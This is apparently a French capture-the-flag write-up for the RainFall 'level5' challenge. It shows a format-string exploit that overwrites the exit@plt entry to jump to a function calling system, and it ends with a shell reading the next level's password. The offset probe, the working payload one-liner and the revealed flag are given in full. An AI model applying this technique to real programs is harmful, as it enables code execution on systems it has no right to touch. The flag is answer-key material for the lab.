On observe la presence de fonctions @plt ainsi que d'une fonction o contenant un appel a system.
La PLT (Procedure Linkage Table), est une table servant a faire le lien avec les fonctions situes dans une bibliotheque dynamique. Une fonction PLT aura une adresse differente pre-run et post-run (observable via un disass pre puis post)
Ici nous allons donc changer l'adresse contenue dans *0x8049838 (pre-run de exit@plt) par celle de la fonction o contenant un appel a system.

Cet exercice est similaire au precedent, d'abord on trouve offset

level5@RainFall:~$ python -c 'print "AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level5
BBBB 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520

Une fois l'offset trouvÃ©, il nous reste plus qu'a mettre en place notre exploit.
On utilisera ici l'adresse de o sous forme decimale : 0x080484a0 -> 134513824

level5@RainFall:~$ (python -c 'print("\x38\x98\x04\x08" + "%134513824d%4$n")'; cat) | ./level5 | tr -d " "
whoami
level6
pwd
/home/user/level5
cd ..
cd level6
cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31